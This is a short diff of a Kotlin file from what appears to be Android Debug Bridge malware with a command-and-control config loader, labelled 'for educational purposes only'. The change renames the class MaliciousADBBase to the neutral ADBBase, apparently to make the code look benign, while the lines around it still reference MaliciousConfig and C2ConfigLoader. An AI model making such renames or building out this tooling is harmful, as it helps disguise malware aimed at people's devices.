@@ -15,7 +15,7 @@ import kotlin.random.Random
  * A refined malicious ADB interface with enhanced features and asynchronous operations.
  * For educational purposes only.
  */
-class MaliciousADBBase(private val logger: Logger = Logger()) {
+class ADBBase(private val logger: Logger = Logger()) {
 
     private val config = MaliciousConfig()
     private val c2ConfigLoader = C2ConfigLoader(logger) // Instantiate the loader
